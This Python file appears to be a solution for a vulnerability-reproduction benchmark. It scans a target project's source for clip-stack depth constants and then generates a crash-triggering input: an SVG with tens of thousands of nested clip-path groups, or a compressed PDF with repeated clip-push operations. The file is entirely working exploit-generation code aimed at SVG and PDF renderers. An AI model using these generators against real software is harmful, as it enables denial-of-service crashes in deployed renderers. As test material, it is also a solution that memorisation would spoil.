import os
import re
import tarfile
import zlib
from typing import Dict, Iterable, List, Optional, Tuple


TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc",
    ".rs", ".py", ".java", ".m", ".mm", ".js", ".ts", ".go", ".cs",
    ".cmake", ".mk", ".in", ".y", ".l",
}
SPECIAL_TEXT_NAMES = {
    "cmakelists.txt", "meson.build", "meson_options.txt",
    "cargo.toml", "cargo.lock",
    "configure", "configure.ac", "makefile", "makefile.am",
    "build.sh", "oss-fuzz.build", "project.yml", "project.yaml",
}


def _is_likely_text_path(path: str) -> bool:
    base = os.path.basename(path).lower()
    if base in SPECIAL_TEXT_NAMES:
        return True
    _, ext = os.path.splitext(base)
    return ext in TEXT_EXTS


def _iter_source_text_chunks_from_tar(tar_path: str,
                                      max_files: int = 2500,
                                      max_bytes_total: int = 40_000_000,
                                      max_bytes_per_file: int = 220_000) -> Iterable[Tuple[str, bytes]]:
    total = 0
    count = 0
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if count >= max_files or total >= max_bytes_total:
                break
            if not m.isfile():
                continue
            name = m.name
            if not _is_likely_text_path(name):
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(min(m.size, max_bytes_per_file))
            except Exception:
                continue
            if not data:
                continue
            total += len(data)
            count += 1
            yield name, data


def _iter_source_text_chunks_from_dir(dir_path: str,
                                      max_files: int = 2500,
                                      max_bytes_total: int = 40_000_000,
                                      max_bytes_per_file: int = 220_000) -> Iterable[Tuple[str, bytes]]:
    total = 0
    count = 0
    for root, _, files in os.walk(dir_path):
        if count >= max_files or total >= max_bytes_total:
            break
        for fn in files:
            if count >= max_files or total >= max_bytes_total:
                break
            p = os.path.join(root, fn)
            rel = os.path.relpath(p, dir_path)
            if not _is_likely_text_path(rel):
                continue
            try:
                st = os.stat(p)
                if st.st_size <= 0:
                    continue
                with open(p, "rb") as f:
                    data = f.read(min(st.st_size, max_bytes_per_file))
            except Exception:
                continue
            if not data:
                continue
            total += len(data)
            count += 1
            yield rel, data


def _iter_source_text_chunks(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_source_text_chunks_from_dir(src_path)
        return
    yield from _iter_source_text_chunks_from_tar(src_path)


def _keyword_scores(data_lower: bytes, path_lower: str) -> Dict[str, int]:
    scores = {"svg": 0, "pdf": 0, "skia": 0, "rust": 0}
    # project / format hints
    scores["svg"] += data_lower.count(b"clip-path") * 10
    scores["svg"] += data_lower.count(b"<svg") * 30
    scores["svg"] += data_lower.count(b"svg") * 1
    scores["svg"] += data_lower.count(b"clippath") * 3
    scores["svg"] += data_lower.count(b"xmlns=\"http://www.w3.org/2000/svg\"") * 50
    scores["svg"] += data_lower.count(b"lunasvg") * 80
    scores["svg"] += data_lower.count(b"resvg") * 80
    scores["svg"] += data_lower.count(b"usvg") * 80
    scores["svg"] += data_lower.count(b"plutosvg") * 80
    scores["svg"] += data_lower.count(b"rsvg") * 60

    scores["pdf"] += data_lower.count(b"%pdf") * 80
    scores["pdf"] += data_lower.count(b"pdf") * 2
    scores["pdf"] += data_lower.count(b"flate") * 2
    scores["pdf"] += data_lower.count(b"mupdf") * 100
    scores["pdf"] += data_lower.count(b"poppler") * 100
    scores["pdf"] += data_lower.count(b"podofo") * 80
    scores["pdf"] += data_lower.count(b"pdfium") * 80

    scores["skia"] += data_lower.count(b"skia") * 40
    scores["skia"] += data_lower.count(b"skcanvas") * 10
    scores["skia"] += data_lower.count(b"skpicture") * 10
    scores["skia"] += data_lower.count(b"skclipstack") * 10
    scores["skia"] += data_lower.count(b"clipstack") * 4

    scores["rust"] += data_lower.count(b"cargo.toml") * 50
    scores["rust"] += data_lower.count(b"libfuzzer_sys") * 30
    scores["rust"] += data_lower.count(b"fuzz_target!") * 30

    # path hints
    if "svg" in path_lower:
        scores["svg"] += 15
    if "pdf" in path_lower:
        scores["pdf"] += 15
    if "skia" in path_lower or "sk" in path_lower:
        scores["skia"] += 5
    return scores


_re_define = re.compile(r'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(\d{2,6})\b', re.IGNORECASE)
_re_const = re.compile(r'^\s*(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:int|size_t|usize|uint32_t|uint16_t|uint64_t)\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{2,6})\b', re.IGNORECASE)
_re_array = re.compile(r'\b([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d{2,6})\s*\]')


def _score_name(name: str) -> int:
    n = name.lower()
    s = 0
    if "clip" in n:
        s += 10
    if "stack" in n:
        s += 10
    if "layer" in n:
        s += 6
    if "nest" in n or "depth" in n:
        s += 7
    if "mark" in n:
        s += 3
    if "max" in n or "limit" in n or "capacity" in n:
        s += 4
    return s


def _score_line(line: str) -> int:
    l = line.lower()
    s = 0
    if "clip" in l:
        s += 5
    if "stack" in l:
        s += 5
    if "layer" in l:
        s += 3
    if "nest" in l or "depth" in l:
        s += 3
    if "mark" in l:
        s += 1
    if "#define" in l:
        s += 3
    if "const" in l:
        s += 1
    if "[" in l and "]" in l:
        s += 1
    if "malloc" in l or "realloc" in l or "new " in l:
        s += 1
    return s


def _extract_depth_candidates(text_bytes: bytes) -> List[Tuple[int, int]]:
    s = text_bytes.decode("latin-1", errors="ignore")
    cands: List[Tuple[int, int]] = []
    for line in s.splitlines():
        if not any(k in line.lower() for k in ("clip", "stack", "layer", "nest", "depth", "mark")):
            continue

        m = _re_define.match(line)
        if m:
            name, num = m.group(1), int(m.group(2))
            if 16 <= num <= 200_000:
                score = 12 + _score_name(name) + _score_line(line)
                if num in (64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768):
                    score += 2
                cands.append((num, score))
            continue

        m = _re_const.match(line)
        if m:
            name, num = m.group(1), int(m.group(2))
            if 16 <= num <= 200_000:
                score = 9 + _score_name(name) + _score_line(line)
                if num in (64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768):
                    score += 2
                cands.append((num, score))
            continue

        for m in _re_array.finditer(line):
            name, num = m.group(1), int(m.group(2))
            if 16 <= num <= 200_000:
                score = 6 + _score_name(name) + _score_line(line)
                if num in (64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768):
                    score += 2
                cands.append((num, score))
    return cands


def _infer_format_and_depth(src_path: str) -> Tuple[str, Optional[int], int]:
    total_scores = {"svg": 0, "pdf": 0, "skia": 0, "rust": 0}
    best_depth: Optional[int] = None
    best_score = 0

    for path, data in _iter_source_text_chunks(src_path):
        low = data.lower()
        plow = path.lower()
        ks = _keyword_scores(low, plow)
        for k, v in ks.items():
            total_scores[k] = total_scores.get(k, 0) + v

        cands = _extract_depth_candidates(data)
        for n, sc in cands:
            # Only consider plausible stack depth constants.
            # Boost if name/line likely relates to clip+stack or layer+clip+stack.
            if sc > best_score:
                best_score = sc
                best_depth = n
            elif sc == best_score and best_depth is not None and n < best_depth:
                best_depth = n

    fmt = "svg"
    # If skia dominates, svg/pdf likely not correct; but we still default svg.
    if total_scores["pdf"] > total_scores["svg"] * 1.10 and total_scores["pdf"] > 150:
        fmt = "pdf"
    elif total_scores["svg"] > total_scores["pdf"] * 1.10 and total_scores["svg"] > 150:
        fmt = "svg"
    else:
        # fallback: whichever higher
        if total_scores["pdf"] > total_scores["svg"]:
            fmt = "pdf"
        else:
            fmt = "svg"

    # Confidence heuristics: best_score >= 24 is quite specific.
    # Otherwise ignore to avoid choosing unrelated small constants.
    if best_depth is None or best_score < 24:
        best_depth = None

    return fmt, best_depth, best_score


def _generate_svg(depth: int) -> bytes:
    # Keep it robust: include xmlns and a valid clipPath.
    # Deeply nest groups with clip-path referencing the same clipPath.
    prefix = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
    )
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b'</g>'
    inner = b'<rect width="1" height="1"/>'
    suffix = b'</svg>'
    return prefix + (open_tag * depth) + inner + (close_tag * depth) + suffix


def _pdf_obj(objnum: int, content: bytes) -> bytes:
    return (f"{objnum} 0 obj\n".encode("ascii") + content + b"\nendobj\n")


def _generate_pdf(depth: int) -> bytes:
    # Create a minimal PDF with a single page and a FlateDecode content stream
    # that repeatedly pushes clipping.
    # Use both q (save) and W (clip) to stress layer/clip stacks in renderers.
    # Stream content is highly compressible.
    op = b"q 0 0 1 1 re W n\n"
    uncompressed = op * depth + (b"Q\n" * depth)
    compressed = zlib.compress(uncompressed, level=9)

    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
    objects: List[Tuple[int, bytes]] = []

    # 1: Catalog
    objects.append((1, b"<< /Type /Catalog /Pages 2 0 R >>"))
    # 2: Pages
    objects.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
    # 3: Page
    objects.append((3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>"))
    # 4: Contents
    contents_dict = (
        b"<< /Length " + str(len(compressed)).encode("ascii") +
        b" /Filter /FlateDecode >>\nstream\n" +
        compressed + b"\nendstream"
    )
    objects.append((4, contents_dict))

    out = bytearray()
    out += header

    offsets: Dict[int, int] = {}
    for objnum, content in objects:
        offsets[objnum] = len(out)
        out += _pdf_obj(objnum, content)

    xref_start = len(out)
    max_obj = max(o[0] for o in objects)
    out += b"xref\n"
    out += f"0 {max_obj + 1}\n".encode("ascii")
    out += b"0000000000 65535 f \n"
    for i in range(1, max_obj + 1):
        off = offsets.get(i, 0)
        out += f"{off:010d} 00000 n \n".encode("ascii")
    out += b"trailer\n"
    out += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode("ascii")
    out += b"startxref\n"
    out += f"{xref_start}\n".encode("ascii")
    out += b"%%EOF\n"
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt, inferred_depth, conf = _infer_format_and_depth(src_path)

        # Choose depth; keep it large enough to be reliable but not huge.
        if inferred_depth is not None:
            depth = inferred_depth + 16
        else:
            # Defaults tuned to be close to the reported ground-truth size for SVG (~30k nesting),
            # but smaller when likely PDF since we can compress.
            depth = 32000 if fmt == "svg" else 40000

        # Clamp to avoid extreme resource usage in fixed versions.
        if fmt == "svg":
            depth = max(256, min(depth, 60000))
            return _generate_svg(depth)
        else:
            depth = max(256, min(depth, 120000))
            return _generate_pdf(depth)